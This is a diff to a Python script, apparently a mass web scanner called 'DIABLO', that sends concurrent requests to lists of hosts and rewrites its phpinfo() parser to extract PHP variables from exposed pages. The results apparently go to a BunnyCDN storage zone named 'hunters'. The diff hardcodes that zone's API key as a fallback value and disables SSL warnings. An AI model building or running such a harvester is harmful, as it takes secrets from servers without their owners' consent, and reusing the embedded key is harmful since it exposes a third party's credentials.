@@ -17,7 +17,6 @@ monkey.patch_all()
 from gevent.pool import Pool
 
 from urllib.parse import urlparse
-from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
 import warnings
 import requests
 import grequests
@@ -42,13 +41,22 @@ logger = logging.getLogger(__name__)
 
 # Disabilita solo i warning di connessione non sicura (SSL) senza silenziare tutto
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
 # Disabilita i warning di urllib3 per header HTTP malformati (es. Content-Length e Transfer-Encoding insieme)
 logging.getLogger("urllib3").setLevel(logging.ERROR)
 
+import http.cookiejar
+# Prevenire crash di http.cookiejar su cookie malformati (bug noto in Python 3.12)
+original_extract_cookies = http.cookiejar.CookieJar.extract_cookies
+def patched_extract_cookies(self, response, request):
+    try:
+        original_extract_cookies(self, response, request)
+    except Exception:
+        pass
+http.cookiejar.CookieJar.extract_cookies = patched_extract_cookies
+
 # Costanti e Configurazioni
 BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/hunters"
-BUNNY_API_KEY = "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc" # Idealmente usare os.getenv("BUNNY_API_KEY")
+BUNNY_API_KEY = os.getenv("BUNNY_API_KEY", "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc")
 
 RESULT_DIR = Path('DIABLO-LOGV9')
 NEW_PATH_EXTRACT = RESULT_DIR / 'DIABLO_FILES_SPLIT'
@@ -194,20 +202,10 @@ def chunked_hosts_multi(file_found: Path, chunk_size: int = 50) -> Iterator[List
         yield chunk
 
 def content_diablo_resp(req: requests.Response) -> str:
-    if sys.version_info[0] < 3:
-        try:
-            try: return str(req.content)
-            except Exception:
-                try: return str(req.content.encode('utf-8'))
-                except Exception: return str(req.content.decode('utf-8'))
-        except Exception: return str(req.text)
-    else:
-        try:
-            try: return str(req.content.decode('utf-8'))
-            except Exception:
-                try: return str(req.content.encode('utf-8'))
-                except Exception: return str(req.text)
-        except Exception: return str(req.content)
+    try:
+        return req.text
+    except UnicodeDecodeError:
+        return req.content.decode('utf-8', errors='ignore')
 
 def clean_subdomain(sub: str, domain: str) -> str:
     sub = sub.lower().strip()
@@ -328,26 +326,27 @@ def check_fake_responses(r: requests.Response) -> Tuple[bool, bool]:
     return False, False
 
 def parse_phpinfo(html_content: str) -> Optional[str]:
-    """Estrae le variabili PHP da una pagina phpinfo()"""
+    """Estrae le variabili PHP da una pagina phpinfo() usando regex (molto più veloce e non blocca gevent)"""
     try:
-        soup = BeautifulSoup(html_content, "html.parser")
-        h2_tag = soup.find("h2", string="PHP Variables")
-        if h2_tag:
-            table = h2_tag.find_next("table")
-            if table:
-                rows = table.find_all("tr")
-                formatted_output = ""
-                for row in rows:
-                    cols = row.find_all("td")
-                    if len(cols) >= 2:
-                        var_name = cols[0].get_text(strip=True)
-                        var_value = cols[1].get_text(strip=True)
-                        match = re.search(r"\['([^']+)'\]", var_name)
-                        if match:
-                            clean_key = match.group(1)
-                            formatted_output += f"{clean_key} \t {var_value}\n"
-                if formatted_output:
-                    return formatted_output
+        match_table = re.search(r'>PHP Variables</h2>(.*?)</table>', html_content, re.IGNORECASE | re.DOTALL)
+        if match_table:
+            table_content = match_table.group(1)
+            formatted_output = ""
+            
+            rows = re.findall(r'<tr>(.*?)</tr>', table_content, re.IGNORECASE | re.DOTALL)
+            for row in rows:
+                cols = re.findall(r'<td[^>]*>(.*?)</td>', row, re.IGNORECASE | re.DOTALL)
+                if len(cols) >= 2:
+                    var_name = re.sub(r'<[^>]+>', '', cols[0]).strip()
+                    var_value = re.sub(r'<[^>]+>', '', cols[1]).strip()
+                    
+                    match = re.search(r"\['([^']+)'\]", var_name)
+                    if match:
+                        clean_key = match.group(1)
+                        formatted_output += f"{clean_key} \t {var_value}\n"
+            
+            if formatted_output:
+                return formatted_output
     except Exception:
         pass
     return None
